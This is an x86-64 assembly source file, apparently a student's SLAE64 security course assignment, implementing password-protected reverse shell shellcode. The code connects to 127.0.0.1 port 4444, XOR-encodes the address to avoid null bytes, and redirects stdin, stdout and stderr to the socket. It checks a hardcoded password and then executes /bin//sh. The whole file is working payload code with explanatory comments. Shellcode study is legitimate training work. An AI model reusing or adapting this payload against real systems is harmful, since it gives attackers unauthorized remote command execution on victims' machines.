; SLAE64 assignment 2
; by Jasper Lievisse Adriaanse
; Student ID: SLAE64-1614
global _start

%define	SYS_WRITE	1
%define	SYS_DUP2	33
%define	SYS_SOCKET	41
%define	SYS_EXECVE	59
%define	SYS_CONNECT	42

section .text

_start:
	; Start by opening a socket(2)
	; syscall:
	;	socket: 41 on Linux/x86_64
	; arguments:
	; 	%rdi: AF_INET = 2
	;	%rsi: SOCK_STREAM = 1
	;	%rdx: 0
	; returns:
	;	%rax: socket file descriptor
	mov al, SYS_SOCKET
	mov dil, 0x2
	mov sil, 0x1
	xor rdx, rdx
	syscall

	; The connect(2) syscall expects the socket fd to be in %rdi, so
	; copy it there already.
	mov rdi, rax

	; Setup server struct sockaddr_in on the stack (in reverse order).
	; Now, we need to take care to prevent a null byte from sneaking in when
	; saving AF_INET. So clear the full 16 bytes we need (double %rax push)
	; and build the stack on top of the zeroed area.
	;
	; Struct members (in reverse order):
	; 	sin_zero:        0
	; 	sin_addr.s_addr: 127.0.0.1
	; 	sin_port:        4444 (in network byteorder)
	; 	sin_family:      AF_INET = 2
	xor rax, rax
	push rax			; sin_zero
	; Since 127.0.0.1 would be written as 0x0100007f contains two NULL bytes
	; we need a different way of representing this address. In this case we
	; XOR it with mask of ones before storing it on the stack.
	mov r13d, 0x1011116e		; result of 0x0100007f ^ 0x11111111
	xor r13d, 0x11111111
	mov dword [rsp-4], r13d		; Finally push 0x0100007f onto the stack
	mov word [rsp-6], 0x5c11
	xor r13, r13			; Clear %r13
	mov r13b, 0x2			; Write 0x2 to the lower 8 bits
	mov word [rsp-8], r13w		; Move the lower 16 bits (including on NULL byte) to the stack
	sub rsp, 8

	; Invoke the connect(2) syscall to establish a connection to the configured
	; remote (127.0.0.1) in this case.
	; syscall:
	;	connect: 42 on Linux/x86_64
	; arguments:
	;	%rdi: socket fd as returned by socket(2)
	;	%rsi: stack pointer (referencing struct sockaddr)
	;	%rdx: 16 (sizeof sockaddr)
	; returns:
	;	%rax: 0 if succesful (ignored)
	mov al, SYS_CONNECT
	mov rsi, rsp
	add rdx, 0x10
	syscall

	; Saves 8 bytes
	; Now duplicate the required file descriptors for STDIN, STDOUT and STDERR with dup2(2).
	; syscall:
	;	dup2: 3 on Linux/x86_64
	; arguments:
	;	%rdi: socket fd
	;	%rsi: fd to duplicate
	; returns:
	;	%rax: 0 if succesful (ignored)
	xor rsi, rsi
	xor rcx, rcx
	mov cl, 0x2	; upperlimit for our loop corresponding to STDERR (2)
	; Now use a loop to increment the number in %rsi to match the file descriptor
	; to operate on.
dup:
	push rcx
	xor rax, rax
	mov al, SYS_DUP2
	syscall
	inc rsi
	pop rcx
	loop dup

        ; Since we don't get a shell prompt, we might as well print a password prompt.
        ; syscall:
        ;       write: 0 on Linux/x86_64
        ; arguments:
        ;       %rdi: socket fd with the connecting client
        ;       %rsi: pointer to a string on the stack
        ;       %rdx: number of bytes to write
        xor rax, rax
        add al, SYS_WRITE
        xor rsi, rsi
        push rsi                ; push terminating NULL to the stack
        mov rsi, 0x203a64726f777373
        push rsi
        mov rsi, 0x6170207265746e65
        push rsi
        mov rsi, rsp            ; load address to our prompt ('enter password:') into %rsi
        xor rdx, rdx
        mov dl, 16              ; size of our prompt
        syscall

        ; The password is 'taptap!!'
        mov rbx, 0x2121706174706174

        ; Read the password provided on the socket fd with read(2)
        ; syscall:
        ;       read: 0 on Linux/x86_64
        ; arguments:
        ;       %rdi: saved socket fd
        ;       %rsi: buffer (on the stack) to read data into
        ;       %rdx: number of bytes to read
        xor rax, rax
        sub rsp, 8      ; allocate 8 bytes of storage on the stack
        mov rsi, rsp
        mov rdx, rax
        add rdx, 8
        syscall

        cmp rbx, [rsi]  ; now perform a raw compare of the buffer pointed to by %rsi
        jnz fail        ; if the comparison didn't result in ZF being set, abort.

	; Now we need to setup the stack for the execve(2) syscall and call it to
	; execute our shell.
	; syscall:
	;	execve: 59 on Linux/x86_64
	; arguments:
	;	%rdi: pointer address of our /bin//sh string on the stack
	;	%rsi: idem
	;	%rdx: NULL
	; returns:
	;	does not return here we terminate afterwards
	push r15	; \0 to terminate our /bin//sh string
	; Now push the string /bin//sh (in reverse) onto the stack
	mov rax, 0x68732f2f6e69622f
	push rax
	mov rdi, rsp	; address to the string
	push r15	; NULL for %RDX
	mov rdx, rsp	; point to the NULL
	push rdi	; Put the address in %RDI on the stack
	mov rsi, rsp	; and put it in %RSI whilst having %RSP adjusted
	mov rax, r15	; setup %RAX for execve() and off we go!
	add al, SYS_EXECVE
	syscall

fail:
	xor rax, rax
	mov rdi, rax
	mov al, 60
	mov dil, 1
	syscall
